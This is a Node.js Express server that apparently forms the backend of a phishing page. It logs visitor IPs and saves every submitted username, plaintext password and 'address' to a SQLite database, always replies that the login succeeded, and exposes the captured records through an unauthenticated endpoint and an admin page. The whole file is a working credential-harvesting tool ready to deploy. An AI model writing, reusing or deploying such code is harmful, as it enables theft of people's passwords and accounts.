const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const db = new sqlite3.Database('./login_records.db');

db.run(`CREATE TABLE IF NOT EXISTS records (
    id INTEGER PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    location TEXT,
    timestamp TEXT
)`);

function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown', location = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    db.run("INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)",
        [type, username, password, address, ip, location, timestamp]);
}

// Record Page Visit Immediately
app.get('/', (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    saveRecord('Page Visit', null, null, null, ip, 'Unknown Location');
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    saveRecord('Page Visit', null, null, null, ip, 'Unknown Location');
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', (req, res) => {
    const { username, password, address } = req.body;
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    saveRecord('Login Attempt', username, password, address, ip);
    res.json({ success: true });
});

app.get('/api/records', (req, res) => {
    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
        res.json(rows);
    });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', (req, res) => {
    db.run("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running`);
});